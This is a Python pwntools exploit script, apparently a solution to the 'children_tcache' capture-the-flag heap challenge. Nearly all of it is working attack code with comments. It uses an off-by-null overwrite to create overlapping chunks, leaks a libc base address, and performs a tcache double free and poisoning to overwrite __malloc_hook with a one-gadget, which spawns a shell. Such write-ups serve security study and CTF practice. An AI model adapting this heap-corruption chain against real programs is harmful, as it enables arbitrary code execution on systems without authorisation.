from pwn import *

def new_heap(size, data, attack=False):
    p.sendlineafter('Your choice: ', '1')
    p.sendlineafter('Size:', str(size))
    if attack:
        return
    p.sendafter('Data:', data)
    if len(data) < size:
        p.sendline()

def show_heap(index):
    p.sendlineafter('Your choice: ', '2')
    p.sendlineafter('Index:', str(index))

def delete_heap(index):
    p.sendlineafter('Your choice: ', '3')
    p.sendlineafter('Index:', str(index))

p = process("./children_tcache")

# heap_list[0] => chunk_0 (0x511)
new_heap(0x500, 'a' * 0x4ff)

# heap_list[1] => chunk_1 (0x71)
new_heap(0x68, 'b' * 0x67)

# heap_list[2] => chunk_2 (0x601)

new_heap(0x5f0, 'c' * 0x5ef)

# heap_list[3] => chunk_3 (0x31)
# This chunk is for preventing consolidation of previous chunk with the top chunk

new_heap(0x20, 'd' * 0x20)
# we need to delete chunk_1, this is because we will be using this chunk to
#  to trigger the off-by-null (poison-null-byte) attack

delete_heap(1)

# chunk_0 should be freed so it can be consolidated with chunk_2 later
delete_heap(0)

# when we free a chunk, programs writes 0xDA to the whole chunk
# so, we need to zero out some parts of the chunk_1. Therefore,
# we are allocating/freeing the chunk_1 multiple times with different sizes
# interestingly, it always have chunk size of 0x71, but the program only cares
# about the input size
for i in range(9):
    # heap_list[0] => chunk_1 (0x71)
    # this causes strcpy writes null byte at the end of buffer.
    # when i == 0, off-by-one happens and turn size of chunk_2 from
    # 0x601 t0 0x600. Therefore, we clear PREV_IN_USE bit.
    new_heap(0x68 - i, 'b' * (0x68 - i))
    # we need to free the chunk, so malloc returns it on the next new_heap call
    delete_heap(0)

# heap_list[0] => chunk_1 (0x71)
# this set the prev_size field of chunk_2
new_heap(0x68, b'b' * 0x60 + p64(0x580))

# when we free chunk_2, it consolidates with chunk_0
# therefore, we have a overlapping free chunk with chunk_1
# the resulting big chunk will be put in the unsorted bin
delete_heap(2)

# heap_list[1] => chunk_4 (0x511)
# this will use the unsorted bin for allocation, and writes
# a libc address into chunk_1 fd/bk fi
new_heap(0x508, 'e' * 0x507)

# viwing chunk_1 will leak libc address
show_heap(0)

libc_addr = p.recvuntil('\n$$')[:-3]
libc_base = u64(libc_addr + b'\x00' * (8 - len(libc_addr))) - 0x3ebca0
log.info('LIBC Base: {}'.format(hex(libc_base)))

# heap_list[2] => chunk_5 (0x71)
# this will allocate chunk_5 exactly in the same place as chunk_1
new_heap(0x68, 'f' * 0x67)

# we used tcache_dup attack here which is due to double free
# freeing chunk_1 and chunk_5 put them in the same bin in tcache
# even though they are pointing to the same address
# This will create a loop within the tcache bin
delete_heap(0)
delete_heap(2)

# we can create a fake chunk i.e. target pointing to the __malloc_hook
malloc_hook = libc_base + 0x3ebc30
fake_chunk = malloc_hook
log.info('fake chunk: {}'.format(hex(fake_chunk)))

# heap_list[4] => chunk_5 (0x71)
# we used tcache_poisoning here
# chunk_5 will be served from tcache and we will put the address of
# our fake chunk in the chunk_1's fd.
new_heap(0x68, p64(fake_chunk))

# heap_list[5] => chunk_1 (0x71)
# this allocation serves chunk_1 and put fake chunk address in the tcache
new_heap(0x68, 'h' * 0x67)
# heap_list[6] => fake_chunk (0x7f)
# since fake_chunk is at the head of the list, this allocation returns it
# then, we overwrite __malloc_hook with one gadget
new_heap(0x68, p64(libc_base + 0x4f432))

# this allocation triggers __malloc_hook and we have shell
new_heap(1, '', True)
p.interactive()